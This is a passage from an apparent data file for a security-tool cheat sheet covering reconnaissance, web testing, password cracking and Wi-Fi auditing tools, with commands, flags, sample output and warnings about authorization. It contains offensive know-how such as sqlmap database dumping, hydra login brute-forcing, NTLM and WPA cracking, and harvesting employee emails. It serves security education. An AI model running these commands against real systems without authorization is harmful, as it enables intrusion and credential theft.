      { flag: '-T4', description: 'Timing template 4: aggressive speed recommended for reliable lab networks' },
      { flag: '-O', description: 'OS detection: fingerprints TCP/IP stack behavior to guess operating system' },
      { flag: '-oA <prefix>', description: 'Output all formats: saves normal (.nmap), XML (.xml), and grepable (.gnmap)' },
    ],
    advantages: [
      'The undisputed industry standard for port scanning and host discovery.',
      'Extensible with thousands of community NSE scripts in `/usr/share/nmap/scripts/`.',
    ],
    disadvantages: [
      'Full port scans (`-p-`) take significant time over high-latency WAN connections.',
      'Aggressive scanning quickly triggers alerts on enterprise IDS/IPS sensors.',
    ],
    whatNotToDo: [
      'NEVER scan networks or IP ranges without explicit written authorization.',
      'Do not use `-T5` on WAN targets; extreme speed drops packet timeouts and misses open ports.',
    ],
    advancedExample: {
      command: 'sudo nmap -sS -sV -p 80,443 --script "vuln and safe" target.lab',
      explanation: 'Targeted scan of web ports executing non-destructive NSE vulnerability assessment scripts.',
      output: `PORT   STATE SERVICE VERSION\n80/tcp open  http    Apache 2.4.49\n| http-vuln-cve2021-41773: VULNERABLE Path Traversal`,
    },
    proTip: "Always save your scan results using `-oA <filename>`. Having the `.xml` format allows you to import results into Metasploit (`db_import`), Zenmap, or reporting engines weeks after the test.",
    tags: ['nmap', 'ports', 'recon', 'scanner', 'services'],
  },
  {
    id: 'whois',
    name: 'whois',
    syntax: 'whois [options] <domain_or_IP>',
    categoryId: 'info-gathering',
    level: 'beginner',
    howItWorks: "Queries international internet registry databases to retrieve the official registration record of a domain or IP block, showing registrant name, company, and DNS nameservers.",
    purpose: "Passive OSINT reconnaissance to map organization boundaries, discover autonomous system numbers (ASN), IP netblocks, and technical administrator contact details.",
    example: 'whois example.com',
    sampleOutput: `Domain Name: EXAMPLE.COM
Registry Domain ID: 2336799_DOMAIN_COM-VRSN
Registrar: RESERVED-Internet Assigned Numbers Authority
Creation Date: 1995-08-14T04:00:00Z
Name Server: A.IANA-SERVERS.NET
Name Server: B.IANA-SERVERS.NET`,
    flags: [
      { flag: '-h <server>', description: 'Specify custom WHOIS server to query (e.g. whois.arin.net)' },
      { flag: '-p <port>', description: 'Connect to custom WHOIS port (default is 43)' },
    ],
    advantages: [
      'Completely passive; never interacts with or touches the target server directly.',
      'Reveals organizational ownership and related IP subnets.',
    ],
    disadvantages: [
      'Modern GDPR privacy redactions hide most personal registrant names and emails.',
    ],
    whatNotToDo: [
      'Do not assume WHOIS records for cloud IPs (AWS/Azure) belong to the target; they belong to the hosting provider.',
    ],
    advancedExample: {
      command: 'whois 192.30.255.113 | grep -E "(NetRange|CIDR|OrgName)"',
      explanation: 'Extracts the exact IP netblock and owner organization for a given target IP address.',
      output: `NetRange: 192.30.252.0 - 192.30.255.255\nCIDR: 192.30.252.0/22\nOrgName: GitHub, Inc.`,
    },
    proTip: "Query the target's Autonomous System Number (ASN) via WHOIS. This gives you the company's entire publicly announced CIDR IP ranges so you don't miss peripheral target servers.",
    tags: ['whois', 'osint', 'domain', 'registration', 'recon'],
  },
  {
    id: 'theharvester',
    name: 'theHarvester',
    syntax: 'theHarvester -d <domain> -b <sources> [options]',
    categoryId: 'info-gathering',
    level: 'intermediate',
    howItWorks: "A high-speed automated OSINT crawler that scours Google, Bing, LinkedIn, and public internet archives to find employee emails, names, subdomains, and IP addresses.",
    purpose: "Passive reconnaissance for social engineering assessments, credential-stuffing wordlists, and discovering hidden developer subdomains.",
    example: 'theHarvester -d targetcompany.com -b duckduckgo,crtsh -l 200',
    sampleOutput: `[*] Target: targetcompany.com
[*] Searching DuckDuckGo (200 results)...
[*] Searching Crtsh...

[*] Emails found: 3
admin@targetcompany.com
support@targetcompany.com
jdoe@targetcompany.com

[*] Hosts found: 3
api.targetcompany.com: 198.51.100.12
dev.targetcompany.com: 198.51.100.18
vpn.targetcompany.com: 198.51.100.25`,
    flags: [
      { flag: '-d <domain>', description: 'Target company domain to gather data for' },
      { flag: '-b <sources>', description: 'Data sources (e.g. google, bing, duckduckgo, crtsh, linkedin, all)' },
      { flag: '-l <limit>', description: 'Limit number of search results to harvest' },
      { flag: '-f <file>', description: 'Save output report to HTML or XML file' },
    ],
    advantages: [
      'Gathers public OSINT without sending a single packet to the target\'s perimeter servers.',
      'Uncovers forgotten developer subdomains and internal naming conventions.',
    ],
    disadvantages: [
      'Search engines like Google will eventually present CAPTCHAs unless API keys are configured.',
    ],
    whatNotToDo: [
      'Do not rely on one search engine alone; always combine search engines with Certificate Transparency (`crtsh`).',
    ],
    advancedExample: {
      command: 'theHarvester -d target.com -b crtsh,anubis,virustotal -f recon_report',
      explanation: 'Uses passive certificate transparency logs and virus databases to enumerate deep infrastructure assets.',
      output: `[+] Reports generated: recon_report.html and recon_report.xml`,
    },
    proTip: "Certificate Transparency (`crtsh`) is the single most valuable source in theHarvester. It unearths valid subdomains for internal apps that search engine web spiders have never crawled.",
    tags: ['theharvester', 'osint', 'emails', 'subdomains', 'recon'],
  },
  {
    id: 'dnsenum',
    name: 'dnsenum',
    syntax: 'dnsenum [options] <domain>',
    categoryId: 'info-gathering',
    level: 'intermediate',
    howItWorks: "An automated DNS reconnaissance toolkit. It gathers DNS records, attempts full zone transfers (AXFR), and brute-forces subdomains using a dictionary wordlist.",
    purpose: "Mapping out the full attack surface of a domain name to find internal portals, staging environments, VPN gateways, and misconfigured DNS servers.",
    example: 'dnsenum --enum targetcorp.org',
    sampleOutput: `dnsenum VERSION:1.2.6
-----   targetcorp.org   -----

Host's addresses:
targetcorp.org.                          300     IN    A        203.0.113.10

Name Servers:
ns1.targetcorp.org.                      300     IN    A        203.0.113.2

Trying Zone Transfers and getting Bind Versions:
Checking for AXFR on targetcorp.org:
AXFR failed on ns1.targetcorp.org: query refused!`,
    flags: [
      { flag: '--enum', description: 'Run all checks: host addresses, nameservers, MX records, and zone transfer tests' },
      { flag: '-f <wordlist>', description: 'Path to wordlist for subdomain brute-forcing' },
      { flag: '-r', description: 'Recursively brute-force subdomains that have NS records' },
      { flag: '--threads <num>', description: 'Number of concurrent threads to accelerate queries' },
    ],
    advantages: [
      'Automates multiple distinct DNS verification steps in a single command.',
      'Identifies CNAME aliases and IP subnets associated with subdomains.',
    ],
    disadvantages: [
      'Heavy brute-force queries can trigger rate-limiting on authoritative DNS servers.',
    ],
    whatNotToDo: [
      'Do not run recursion (`-r`) on large public domains without specifying an explicit limit.',
    ],
    advancedExample: {
      command: 'dnsenum -f /usr/share/wordlists/dnsmap.txt --noreverse target.lab',
      explanation: 'Executes rapid dictionary subdomain discovery without performing slow reverse lookups.',
      output: `mail.target.lab.      300 IN A 192.168.1.15\ngit.target.lab.       300 IN A 192.168.1.20`,
    },
    proTip: "Always check the top of the output for AXFR (Zone Transfer). If the DNS administrator forgot to restrict transfers, `dnsenum` will output 100% of the internal hostnames in under 2 seconds.",
    tags: ['dns', 'dnsenum', 'subdomain', 'axfr', 'recon'],
  },

  // ==========================================
  // WEB APPLICATION TESTING
  // ==========================================
  {
    id: 'nikto',
    name: 'nikto',
    syntax: 'nikto -h <target_host> [options]',
    categoryId: 'web-testing',
    level: 'beginner',
    howItWorks: "A metal detector for web servers. It fires thousands of quick checks against a web application looking for outdated server versions, default passwords, dangerous files, and misconfigurations.",
    purpose: "Rapid baseline web server vulnerability scanning during initial assessment phases.",
    example: 'nikto -h http://192.168.1.180',
    sampleOutput: `- Nikto v2.5.0
+ Target IP:          192.168.1.180
+ Target Port:        80
+ Server: Apache/2.4.29 (Ubuntu)
+ [!] The anti-clickjacking X-Frame-Options header is not present.
+ [+] Apache/2.4.29 appears to be outdated (current is at least 2.4.58).
+ [+] /phpmyadmin/: phpMyAdmin directory found.
+ [+] /robots.txt: contains 2 disallowed entries that should be inspected.`,
    flags: [
      { flag: '-h <host>', description: 'Target host: IP address, domain, or full URL' },
      { flag: '-p <port>', description: 'Port number to test (default is 80; use 443 for HTTPS)' },
      { flag: '-ssl', description: 'Force SSL/TLS mode for HTTPS testing' },
      { flag: '-o <file>', description: 'Save output report to HTML, XML, or CSV' },
      { flag: '-Tuning <type>', description: 'Focus scan on specific checks (1=info, 4=injection, 9=sql)' },
    ],
    advantages: [
      'Fast, simple setup to identify low-hanging fruit and outdated web versions.',
      'Identifies dangerous HTTP methods (PUT, DELETE) and insecure headers.',
    ],
    disadvantages: [
      'VERY noisy; generates hundreds of HTTP requests per minute that light up intrusion detection systems.',
      'Does not crawl single-page applications (React/Vue) or test complex logic flaws.',
    ],
    whatNotToDo: [
      'Never run Nikto on production web servers without scheduling a testing window; it can trigger automated IP blocks.',
    ],
    advancedExample: {
      command: 'nikto -h https://target.lab -ssl -C all -Format htm -output report.html',
      explanation: 'Scans an encrypted HTTPS host, checks all CGI directories, and exports an HTML report.',
      output: `+ Scan completed in 42 seconds. Report saved to report.html.`,
    },
    proTip: "Nikto is not designed for modern client-side Single Page Apps (SPAs). If auditing a React or Angular frontend, crawl the app manually with Burp Suite first, then scan specific endpoints.",
    tags: ['nikto', 'web', 'vulnerability', 'scanner', 'cve'],
  },
  {
    id: 'gobuster',
    name: 'gobuster',
    syntax: 'gobuster dir -u <URL> -w <wordlist> [options]',
    categoryId: 'web-testing',
    level: 'beginner',
    howItWorks: "Knocks on thousands of hidden doors on a website (like /admin, /backup, /secret, /api) in seconds using a dictionary list, listening to the status codes (200 OK, 301 Redirect, 403 Forbidden).",
    purpose: "Discovering unlinked administrative panels, backup files, configuration leaks, and hidden API endpoints.",
    example: 'gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html',
    sampleOutput: `===============================================================
Gobuster v3.6
===============================================================
[+] Url:         http://10.10.10.5
[+] Wordlist:    /usr/share/wordlists/dirb/common.txt
===============================================================
/admin                (Status: 301) [Size: 312] [--> /admin/]
/config.php           (Status: 200) [Size: 0]
/robots.txt           (Status: 200) [Size: 45]
/uploads              (Status: 301) [Size: 314]`,
    flags: [
      { flag: 'dir', description: 'Directory and file discovery mode' },
      { flag: '-u <url>', description: 'Target base URL to scan' },
      { flag: '-w <path>', description: 'Path to wordlist dictionary' },
      { flag: '-x <ext>', description: 'File extensions to append (e.g. php,txt,bak,zip)' },
      { flag: '-t <threads>', description: 'Number of concurrent threads (default 10)' },
      { flag: '-k', description: 'Skip SSL certificate verification in labs' },
    ],
    advantages: [
      'Written in Go, running blisteringly fast with minimal CPU/RAM usage.',
      'Supports directory, DNS subdomain, and virtual host (vhost) fuzzing modes.',
    ],
    disadvantages: [
      'Does not parse responsive response body sizes to automatically filter wildcards.',
    ],
    whatNotToDo: [
      'Do not forget the `-x` flag! Critical files like `config.php.bak` will be completely missed without extensions.',
    ],
    advancedExample: {
      command: 'gobuster dir -u http://target.lab -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,bak,old,zip -t 30 -b 404',
      explanation: 'Deep directory audit searching for backup files with 30 threads while explicitly ignoring 404 responses.',
      output: `/db_backup.zip (Status: 200) [Size: 1420581]`,
    },
    proTip: "Always include backup extensions with `-x bak,old,zip,sql`. Finding `/config.php.bak` or `/db.sql` frequently yields database passwords without needing any exploit at all.",
    tags: ['gobuster', 'directories', 'fuzzing', 'wordlist', 'web'],
  },
  {
    id: 'ffuf',
    name: 'ffuf',
    syntax: 'ffuf -u <URL_WITH_FUZZ> -w <wordlist> [options]',
    categoryId: 'web-testing',
    level: 'intermediate',
    howItWorks: "A lightning-fast slot machine tester. Wherever you place the keyword 'FUZZ' in a URL, parameter, or HTTP header, ffuf swaps in thousands of words from a dictionary to analyze differences in server responses.",
    purpose: "High-speed directory fuzzing, parameter discovery (`?FUZZ=1`), virtual host identification, and API endpoint fuzzing.",
    example: 'ffuf -u http://10.10.10.5/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301',
    sampleOutput: `'url'      : 'http://10.10.10.5/FUZZ'
'wordlist' : '/usr/share/wordlists/dirb/common.txt'

images                  [Status: 301, Size: 314, Words: 20]
assets                  [Status: 301, Size: 314, Words: 20]
dashboard               [Status: 200, Size: 4120, Words: 280]
:: Progress: [4614/4614] :: 4820 req/sec ::`,
    flags: [
      { flag: '-u <url>', description: 'Target URL containing the keyword FUZZ' },
      { flag: '-w <path>', description: 'Path to wordlist dictionary' },
      { flag: '-mc <code>', description: 'Match HTTP status codes (e.g. 200,301,302,500)' },
      { flag: '-fs <size>', description: 'Filter out responses of an exact byte size (eliminates false positives)' },
      { flag: '-H "Header: FUZZ"', description: 'Fuzz HTTP headers (used for Host header virtual host routing)' },
      { flag: '-t <threads>', description: 'Concurrent threads (default 40)' },
    ],
    advantages: [
      'One of the fastest web fuzzers available, capable of thousands of requests per second.',
      'Unsurpassed response filtering options based on byte size (`-fs`), word count (`-fw`), and regex.',
    ],
    disadvantages: [
      'High request rates can exhaust target web server connections if not calibrated.',
    ],
    whatNotToDo: [
      'Do not forget to filter false-positive wildcard responses (`-fs <size>`); otherwise you will drown in thousands of fake matches.',
    ],
    advancedExample: {
      command: 'ffuf -u http://target.lab -H "Host: FUZZ.target.lab" -w /usr/share/wordlists/amass/subdomains.txt -fs 1420',
      explanation: 'Fuzzes the HTTP Host header to discover hidden Virtual Hosts (VHosts) hosted on the same IP.',
      output: `dev.target.lab          [Status: 200, Size: 5821, Words: 412]`,
    },
    proTip: "Before fuzzing, make a request to a nonexistent URL (`/doesnotexist404`) and note the response size. Then pass `-fs <that_size>` to ffuf. This eliminates 100% of generic custom error pages.",
    tags: ['ffuf', 'fuzzer', 'web', 'vhosts', 'parameters'],
  },
  {
    id: 'sqlmap',
    name: 'sqlmap',
    syntax: 'sqlmap -u <target_url> [options]',
    categoryId: 'web-testing',
    level: 'intermediate',
    howItWorks: "Tests whether a database can be tricked by typing sneaky SQL sentences into search boxes or URL parameters. Once a flaw is confirmed, it automates reading table data, dumping hashes, or executing commands.",
    purpose: "Automating the detection and exploitation of SQL injection (SQLi) vulnerabilities in web applications.",
    example: 'sqlmap -u "http://target.lab/product.php?id=1" --dbs --batch',
    sampleOutput: `[INFO] GET parameter 'id' is vulnerable.
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 8112=8112
---
[INFO] the back-end DBMS is MySQL
available databases [2]:
[*] shop_db
[*] users_db`,
    flags: [
      { flag: '-u <url>', description: 'Target URL with parameter to test (e.g. ?id=1)' },
      { flag: '--dbs', description: 'Enumerate DBMS databases once injection point is confirmed' },
      { flag: '-D <db> --tables', description: 'Enumerate tables present inside specified database' },
      { flag: '-T <table> --dump', description: 'Dump contents of specified table' },
      { flag: '--batch', description: 'Non-interactive: never ask for user input, use default behavior' },
      { flag: '--cookie="s=xyz"', description: 'Provide authentication cookies for protected endpoints' },
    ],
    advantages: [
      'Supports all SQL injection techniques (Boolean, Time-based, Error, UNION, Stacked).',
      'Supports MySQL, PostgreSQL, Oracle, MSSQL, SQLite, and 30+ other database engines.',
    ],
    disadvantages: [
      'Blind injection attacks require hundreds of requests and take significant time.',
      'Aggressive injection can corrupt database tables or lock relational records.',
    ],
    whatNotToDo: [
      'CRITICAL: Never run `--os-shell` or aggressive writes against production databases without client sign-off.',
    ],
    advancedExample: {
      command: 'sqlmap -r request.txt --level 3 --risk 2 --batch --dbs',
      explanation: 'Parses a full raw HTTP request saved from Burp Suite, testing headers and cookies for SQL injection.',
      output: `[+] Back-end DBMS: PostgreSQL 14\navailable databases [3]: public, dev, billing`,
    },
    proTip: "Save a raw HTTP request directly from Burp Suite (`Right Click > Save Item`) and run `sqlmap -r request.txt`. This avoids tricky command-line escaping of cookies, user-agents, and POST bodies.",
    tags: ['sqlmap', 'sqli', 'database', 'injection', 'web'],
  },
  {
    id: 'burpsuite',
    name: 'Burp Suite',
    syntax: 'burpsuite &',
    categoryId: 'web-testing',
    level: 'beginner',
    howItWorks: "An invisible postal inspector sitting between your web browser and the internet. Every time you click a button or submit a form, Burp catches the letter, lets you edit the contents, and sends it on.",
    purpose: "The primary tool for web application security assessments, manual parameter tampering, session token inspection, and API testing.",
    example: 'burpsuite &',
    sampleOutput: `[+] Starting Burp Suite Community Edition...
[+] Listening on proxy port: 127.0.0.1:8080
[+] CA Certificate loaded. Ready to intercept traffic.`,
    flags: [
      { flag: 'Proxy Tab', description: 'Intercepts HTTP/S requests in real time to inspect and tamper headers' },
      { flag: 'Repeater Tab', description: 'Modify and resend individual requests repeatedly to analyze server responses' },
      { flag: 'Intruder Tab', description: 'Automates custom payload attacks against specified positions' },
      { flag: 'Decoder Tab', description: 'Converts raw text between URL, HTML, Base64, and Hex formats' },
    ],
    advantages: [
      'The industry gold standard graphical tool for web penetration testing.',
      'Unsurpassed manual testing capabilities with Repeater and Decoder.',
    ],
    disadvantages: [
      'Intruder attack speed is heavily throttled in the free Community Edition.',
    ],
    whatNotToDo: [
      'Do not forget to configure your browser to trust Burp\'s CA certificate (`http://burp/cert`), or HTTPS sites will fail with TLS errors.',
    ],
    advancedExample: {
      command: 'Configure Target Scope > Advanced > Drop out of scope requests',
      explanation: 'Silences all background browser and OS telemetry so your HTTP history shows only the target web app.',
      output: `Only requests matching target.lab appear in HTTP proxy history.`,
    },
    proTip: "In Burp Suite, use `Ctrl+R` to instantly send any intercepted request to Repeater. You can then tweak headers, cookies, and parameters in isolation without refreshing your browser.",
    tags: ['burp', 'proxy', 'repeater', 'intercept', 'web'],
  },

  // ==========================================
  // PASSWORD SECURITY & AUDITING
  // ==========================================
  {
    id: 'hashcat',
    name: 'hashcat',
    syntax: 'hashcat -m <hash_type> -a <attack_mode> <hash_file> <wordlist>',
    categoryId: 'password-security',
    level: 'intermediate',
    howItWorks: "Uses your computer's high-speed gaming graphics card (GPU) to guess scrambled password puzzles millions of times every single second until it finds a word that matches the target hash.",
    purpose: "Offline recovery of lost passwords from dumped database hashes (MD5, SHA-256, NTLM, Kerberos tickets, and encrypted file headers).",
    example: 'hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt',
    sampleOutput: `hashcat (v6.2.6) starting...
e8d95a51f3af4a3b134bf6bb680a213a:password123

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Speed.#1.........: 1420.2 MH/s`,
    flags: [
      { flag: '-m <mode>', description: 'Hash type mode (e.g. 0=MD5, 100=SHA1, 1000=NTLM, 1800=sha512crypt)' },
      { flag: '-a 0', description: 'Straight dictionary attack (tests words directly from a wordlist)' },
      { flag: '-a 3', description: 'Mask brute-force attack (e.g. ?l?l?l?d?d for 3 letters + 2 digits)' },
      { flag: '-r <rule_file>', description: 'Apply mutation rules (capitalization, leetspeak, suffix numbers)' },
      { flag: '--show', description: 'Display already cracked passwords from the potfile without re-running' },
    ],
    advantages: [
      'The fastest password recovery utility on Earth when powered by GPU compute cores.',
      'Supports hundreds of modern cryptographic hashing algorithms.',
    ],
    disadvantages: [
      'Draws high electrical power and generates significant heat on GPUs.',
    ],
    whatNotToDo: [
      'Do not run pure brute-force on long 12+ character hashes; use rule-based wordlists instead.',
    ],
    advancedExample: {
      command: 'hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule',
      explanation: 'Cracks Windows Active Directory NTLM password hashes using rockyou and the best64 rule mutations.',
      output: `Cracked 142 of 200 hashes in 18 seconds.`,
    },
    proTip: "Never run simple dictionary attacks without rules. Appending `-r /usr/share/hashcat/rules/best64.rule` tests common capitalization and year mutations, multiplying your crack rate with minimal time penalty.",
    tags: ['hashcat', 'hashes', 'gpu', 'passwords', 'cracking'],
  },
  {
    id: 'john',
    name: 'john',
    syntax: 'john [options] <password_file>',
    categoryId: 'password-security',
    level: 'beginner',
    howItWorks: "A classic codebreaker. Feeds words from a dictionary into mathematical algorithms to see which word produces the exact scrambled hash found inside `/etc/shadow` or encrypted archives.",
    purpose: "Auditing Unix user passwords, testing password complexity policies, and cracking encrypted ZIP, RAR, or SSH private keys.",
    example: 'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt',
    sampleOutput: `Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5)
password123      (admin)
1g 0:00:00:00 DONE (2026-10-30 14:15)
Use the "--show" option to display all cracked passwords`,
    flags: [
      { flag: '--wordlist=<path>', description: 'Path to wordlist file' },
      { flag: '--format=<format>', description: 'Specify hash format (e.g. raw-md5, raw-sha256, nt, sha512crypt)' },
      { flag: '--rules', description: 'Enable word mangling rules to mutate dictionary words' },
      { flag: '--show', description: 'Display passwords that have already been cracked in past sessions' },
    ],
    advantages: [
      'Automatically auto-detects many hash types without manual configuration.',
      'Includes companion utilities like `ssh2john` and `zip2john` to extract hashes from files.',
    ],
    disadvantages: [
      'Primarily CPU-bound by default, slower than Hashcat on massive GPU rigs.',
    ],
    whatNotToDo: [
      'Do not forget to unshadow `/etc/passwd` and `/etc/shadow` together using `unshadow` before cracking Linux system hashes.',
    ],
    advancedExample: {
      command: 'ssh2john id_rsa > id_rsa.hash && john --wordlist=rockyou.txt id_rsa.hash',
      explanation: 'Extracts the passphrase hash from an encrypted SSH private key and recovers the passphrase.',
      output: `hunter2 (id_rsa)`,
    },
    proTip: "Check `/usr/share/john/` for helper conversion scripts: `ssh2john.py`, `zip2john`, `keepass2john`, and `pdf2john.pl`. They convert locked files into hash strings that John can crack instantly.",
    tags: ['john', 'jtr', 'hashes', 'passwords', 'cracking'],
  },
  {
    id: 'hydra',
    name: 'hydra',
    syntax: 'hydra -l <user> -P <passwords> <target> <service>',
    categoryId: 'password-security',
    level: 'intermediate',
    howItWorks: "A robotic hand that rapidly tries different keys into a front door lock (like SSH, FTP, or web login forms) over the network until one turns.",
    purpose: "Online authentication brute-forcing and dictionary attacks against network protocols (SSH, FTP, HTTP-POST, RDP, SMB, MySQL).",
    example: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.50 ssh -t 4',
    sampleOutput: `Hydra v9.5 (c) 2026 by van Hauser / THC
[DATA] max 4 tasks per host
[22][ssh] host: 192.168.1.50   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found`,
    flags: [
      { flag: '-l <user>', description: 'Single login username to test' },
      { flag: '-L <file>', description: 'File containing list of multiple usernames' },
      { flag: '-p <pass>', description: 'Single password to test across users' },
      { flag: '-P <file>', description: 'File containing dictionary of passwords to test' },
      { flag: '-t <tasks>', description: 'Number of parallel tasks (keep low for SSH to avoid rate limits)' },
      { flag: '-V', description: 'Verbose mode: show each attempted credential on screen' },
    ],
    advantages: [
      'Supports over 50 network protocols (SSH, FTP, HTTP forms, SMB, RDP).',
      'Fast multi-threaded parallel connection engine.',
    ],
    disadvantages: [
      'High thread counts trigger account lockouts and trip fail2ban IP blocks.',
    ],
    whatNotToDo: [
      'CRITICAL: Only run Hydra on lab systems. Unauthorized brute-forcing will trigger alarm bells and lock out legitimate users.',
    ],
    advancedExample: {
      command: 'hydra -l admin -P rockyou.txt 10.10.10.5 http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid credentials"',
      explanation: 'Performs dictionary attack against an HTTP web login form, detecting failure by checking for "Invalid credentials".',
      output: `[80][http-post-form] host: 10.10.10.5   login: admin   password: password123`,
    },
    proTip: "Keep SSH concurrency low (`-t 4`). Default OpenSSH servers have a `MaxStartups` setting that drops connections if more than 10 unauthenticated handshakes occur at once, creating false negatives.",
    tags: ['hydra', 'bruteforce', 'ssh', 'ftp', 'passwords', 'login'],
  },

  // ==========================================
  // WIRELESS SECURITY
  // ==========================================
  {
    id: 'airmon-ng',
    name: 'airmon-ng',
    syntax: 'sudo airmon-ng [start | stop | check kill] <interface>',
    categoryId: 'wireless-security',
    level: 'intermediate',
    howItWorks: "Puts your Wi-Fi card into 'super listener' mode (monitor mode) so it can hear all 802.11 radio whispers in the air instead of just its own router.",
    purpose: "Enabling and disabling monitor mode on wireless adapters for packet injection, handshake capturing, and rogue AP detection.",
    example: 'sudo airmon-ng check kill && sudo airmon-ng start wlan0',
    sampleOutput: `Killing these processes:
    PID Name
    612 wpa_supplicant
    704 NetworkManager

PHY	Interface	Driver		Chipset
phy0	wlan0		ath9k_htc	Atheros AR9271
		(mac80211 monitor mode enabled for wlan0 on wlan0mon)`,
    flags: [
      { flag: 'check kill', description: 'Kills background processes (NetworkManager, wpa_supplicant) that interfere' },
      { flag: 'start <iface>', description: 'Enables monitor mode on the specified wireless card' },
      { flag: 'stop <iface>', description: 'Disables monitor mode and returns interface to managed station mode' },
    ],
    advantages: [
      'The official utility of the aircrack-ng suite for setting up wireless audit interfaces.',
    ],
    disadvantages: [
      'Requires compatible wireless adapter chipset that supports monitor mode and packet injection.',
    ],
    whatNotToDo: [
      'Do not forget to restart NetworkManager (`sudo systemctl restart NetworkManager`) when finished auditing.',
    ],
    advancedExample: {
      command: 'sudo airmon-ng stop wlan0mon && sudo systemctl restart NetworkManager',
      explanation: 'Cleans up monitor mode and restores your normal Wi-Fi internet connection.',
      output: `NetworkManager active and reconnected to home Wi-Fi.`,
    },
    proTip: "Always run `sudo airmon-ng check kill` before starting monitor mode; otherwise NetworkManager will continually attempt to roam and reset the card into managed mode.",
    tags: ['wifi', 'wireless', 'airmon', 'monitormode', 'radio'],
  },
  {
    id: 'airodump-ng',
    name: 'airodump-ng',
    syntax: 'sudo airodump-ng [options] <mon_interface>',
    categoryId: 'wireless-security',
    level: 'intermediate',
    howItWorks: "A radar screen that lists every Wi-Fi router in the neighborhood, their channel numbers, signal strength, and who is connected to them.",
    purpose: "Capturing 802.11 raw frames, recording WPA/WPA2 4-way handshakes, and enumerating wireless BSSIDs and clients.",
    example: 'sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture_lab wlan0mon',
    sampleOutput: `CH  6 ][ Elapsed: 12 s ][ WPA handshake: AA:BB:CC:DD:EE:FF

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 AA:BB:CC:DD:EE:FF  -42       84      120   14   6  130   WPA2 CCMP   PSK  HomeLab_WiFi`,
    flags: [
      { flag: '-c <channel>', description: 'Lock listening to a single 802.11 radio channel instead of channel-hopping' },
      { flag: '--bssid <mac>', description: 'Filter and record frames only for one specific wireless access point' },
      { flag: '-w <prefix>', description: 'Save all captured packets and handshakes to a .cap file with this prefix' },
    ],
    advantages: [
      'Real-time live display of air traffic, signal strengths, and connected client MACs.',
    ],
    disadvantages: [
      'Channel hopping misses brief packet exchanges unless locked to a single channel.',
    ],
    whatNotToDo: [
      'Do not attempt to capture handshakes without locking the channel (`-c`), as hopping misses 80% of packets.',
    ],
    advancedExample: {
      command: 'sudo airodump-ng --wps wlan0mon',
      explanation: 'Displays only access points with Wi-Fi Protected Setup (WPS) enabled for Pixie Dust attacks.',
      output: `BSSID              CH  WPS  VER  LOCKED  ESSID\nAA:BB:CC:DD:EE:FF   6  Yes  1.0  No      RouterLab`,
    },
    proTip: "Lock your capture to a single channel (`-c <num>`). If you hop channels, you will almost certainly miss the transient 4-way WPA handshake when a device connects.",
    tags: ['wifi', 'airodump', 'handshake', 'bssid', 'wireless'],
  },
  {
    id: 'aircrack-ng',
    name: 'aircrack-ng',
    syntax: 'aircrack-ng [options] <capture.cap>',
    categoryId: 'wireless-security',
    level: 'intermediate',
    howItWorks: "The codebreaker for Wi-Fi passwords. Takes the 4-way handshake captured out of the air by airodump and tests millions of passwords against it completely offline.",
    purpose: "Auditing WEP and WPA/WPA2 pre-shared keys (PSK) without interacting with the physical router again.",
    example: 'aircrack-ng -w /usr/share/wordlists/rockyou.txt capture_lab-01.cap',
    sampleOutput: `Aircrack-ng 1.7
[00:00:15] 142012/14344384 keys tested (9210 k/s)

      KEY FOUND! [ summer2024 ]

Master Key     : 12 34 AB CD ...
Transient Key  : 56 78 EF 90 ...`,
    flags: [
      { flag: '-w <wordlist>', description: 'Path to wordlist dictionary for WPA password recovery' },
      { flag: '-b <bssid>', description: 'Specify target access point BSSID MAC address' },
      { flag: '-q', description: 'Quiet mode: only prints key when found' },
    ],
    advantages: [
      'Completely offline: once the handshake is captured, testing generates zero wireless radio noise.',
    ],
    disadvantages: [
      'WPA2 cracking speed is limited by dictionary size and CPU performance compared to Hashcat.',
    ],
    whatNotToDo: [
      'Never attempt to capture handshakes or audit networks you do not own or have written permission to test.',
    ],
    advancedExample: {
      command: 'aircrack-ng -J capture_hashcat capture.cap',
      explanation: 'Converts a captured .cap file into `.hccapx` format for ultra-fast GPU cracking with Hashcat.',
      output: `Converted to capture_hashcat.hccapx`,
    },
    proTip: "Convert your `.cap` file to `.22000` format using `hcxpcapngtool` and crack it with Hashcat mode `-m 22000` on your GPU for a 50x speedup over CPU-based aircrack-ng.",
    tags: ['wifi', 'aircrack', 'handshake', 'wpa2', 'wireless'],
  },
  {
    id: 'wifite',
    name: 'wifite',
    syntax: 'sudo wifite [options]',
    categoryId: 'wireless-security',
    level: 'beginner',
    howItWorks: "An automatic co-pilot for Wi-Fi auditing. You start it, pick your lab network from a menu, and it handles switching channels, capturing handshakes, and running dictionary checks automatically.",
    purpose: "Automated wireless auditing of WEP, WPA, WPA2, and WPS networks during authorized wireless assessments.",
    example: 'sudo wifite --wpa --kill',
    sampleOutput: `   wifite v2.6.6
   automated wireless auditor

 [+] Scanning for wireless targets... (Press Ctrl+C when ready)
  NUM                      ESSID   CH  ENCR   POWER  WPS?  CLIENT
  ---  -------------------------  ---  ----  ------  ----  ------
    1               HomeLab_WiFi    6   WPA2   58db    no    yes
 [+] Select target (1-1): 1
 [+] Listening for WPA Handshake on channel 6... [Captured handshake!]`,
    flags: [
      { flag: '--wpa', description: 'Target only WPA and WPA2 networks (ignores WEP)' },
      { flag: '--kill', description: 'Automatically kill conflicting network processes before scanning' },
      { flag: '-mac', description: 'Anonymize your wireless MAC address with a randomized MAC' },
